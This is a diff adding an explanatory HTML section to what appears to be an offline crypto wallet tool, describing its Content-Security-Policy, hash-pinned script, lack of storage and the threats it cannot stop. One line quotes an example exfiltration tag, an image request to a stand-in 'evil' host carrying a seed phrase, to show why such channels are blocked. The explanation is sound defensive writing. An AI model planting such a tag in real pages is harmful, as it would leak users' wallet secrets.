@@ -1,0 +1,51 @@
+  <div class="card">
+    <div class="prose">
+      <h3>What protects your keys here — and what doesn't</h3>
+      <p>Most wallet tools claim to be "100% client-side and secure". That sentence is worth almost nothing, because it describes an intention rather than a mechanism. Here is the mechanism, and its limits.</p>
+
+      <h4>The load-bearing part: connect-src 'none'</h4>
+      <p>The page ships a Content-Security-Policy that tells your browser to refuse every outbound request this page could make — <code>fetch</code>, <code>XMLHttpRequest</code>, WebSocket, <code>sendBeacon</code>, all of it. Not "we promise not to". The browser will not permit it.</p>
+      <p>The reason this matters more than a promise: it holds <strong>even if this page's JavaScript turns malicious</strong>. If someone compromised this repository tomorrow and replaced the app with a key-stealer, the stealer would have nowhere to send what it stole. Images, stylesheets, fonts and form submissions are locked down for the same reason — every one of them is an exfiltration channel if you leave it open, and <code>&lt;img src="https://evil/?seed=…"&gt;</code> works just as well as a network call.</p>
+
+      <h4>The rest of the mechanism</h4>
+      <ul>
+        <li><strong>No CDNs, no eval, nothing fetched at all.</strong> This page is a single file: the app, the cryptography, the stylesheet, the fonts and the worker thread are inside it. The old version of this tool loaded ethers from jsDelivr inside a worker — meaning a bad day at a CDN was a bad day for your keys.</li>
+        <li><strong>The script is pinned by its own hash.</strong> The policy above names the SHA-256 of the code in this file. Your browser recomputes it on every load and runs the code only on an exact match — so a modified file does not run a modified app, it runs nothing, and says so. It also means an injected script tag cannot execute: it cannot match a hash computed before it existed.</li>
+        <li><strong>Because it fetches nothing, it runs anywhere.</strong> Save this file, unplug the machine, open it from a folder. Identical behaviour, no server, no network.</li>
+        <li><strong>No storage.</strong> No localStorage, no IndexedDB, no cookies, nothing in the URL. <code>localStorage</code> is actively redefined to throw, so a future edit that tries to stash a seed fails loudly instead of shipping quietly.</li>
+        <li><strong>No innerHTML.</strong> Every address and key reaches the screen through <code>textContent</code>. There is no HTML-injection sink to find.</li>
+        <li><strong>Frozen prototypes</strong> before the crypto loads, so prototype pollution cannot change what a <code>Uint8Array</code> means halfway through a key derivation.</li>
+        <li><strong>Audited dependencies only</strong> — the <code>@noble</code> and <code>@scure</code> libraries, pinned by version and hash, bundled unminified so you can read them. Nothing in the bundle is capable of network I/O.</li>
+      </ul>
+
+      <h4>What none of that stops</h4>
+      <div class="callout">
+        <ul>
+          <li><strong>Browser extensions.</strong> Their content scripts run in a separate world with their own permissions. They can read this page and make their own requests, and this page's CSP does not constrain them. No JavaScript here can change that.</li>
+          <li><strong>A compromised operating system.</strong> Keyloggers, clipboard scrapers, screen capture. Nothing in a browser tab defends against the machine it runs on.</li>
+          <li><strong>A tampered file, tampered consistently.</strong> The hash in the policy makes the browser refuse a modified script — but whoever can rewrite the script can rewrite the hash next to it. That is tamper-evidence against a partial compromise, not proof of honesty. Only comparing the published SHA-256 of this whole file against your copy gives you that, and only because it is published somewhere other than this file.</li>
+          <li><strong>Someone reading your screen.</strong> Hence the blur on every secret until you ask for it.</li>
+        </ul>
+      </div>
+      <p>The environment panel reports facts about where you are running. It is not a guarantee — a page that had already been compromised could lie about every line of it.</p>
+
+      <h3>If the wallet will hold real money</h3>
+      <ol>
+        <li><strong>Save this page to disk</strong> — it is already a single self-contained file — and verify its SHA-256 against the published release.</li>
+        <li><strong>Disconnect.</strong> Turn off Wi-Fi. The environment panel will show <span class="mono">offline</span>. This is the step that actually defeats extensions and drive-by scripts, because it removes the network they need.</li>
+        <li><strong>Use a clean browser profile</strong> with no extensions, or better, a live USB session on a machine with no persistent storage.</li>
+        <li><strong>Write the phrase on paper.</strong> Not a photo, not a note app, not a password manager's notes field. Two copies, two locations.</li>
+        <li><strong>Verify before funding.</strong> Restore the phrase into the wallet you actually intend to use and confirm it shows the same first address. Send a small test amount first. Every time.</li>
+        <li><strong>Close the browser</strong> when done, and reboot if you were on a shared machine.</li>
+      </ol>
+      <div class="callout callout--fact">
+        <strong>Better still: use a hardware wallet.</strong> For any amount you would miss, a device that never exposes the key to a general-purpose computer beats every software precaution on this page. This tool is at its best for testing, for learning how derivation works, for checking that a phrase produces the addresses you expect, and for vanity addresses you have thought carefully about.
+      </div>
+
+      <h3>Verifying you are running what you think</h3>
+      <p>Every release publishes a SHA-256. Because everything is in one file, one hash covers the whole application:</p>
+      <p><code>shasum -a 256 index.html</code></p>
+      <p>Compare against the release notes. If they differ, do not use it. The build is reproducible from source with <code>npm run build</code>, and CI re-runs that on every commit to assert the committed files still match <code>src/</code> — so a change smuggled into the built output, without a matching source change, fails the pipeline visibly.</p>
+    </div>
+
+  </div>
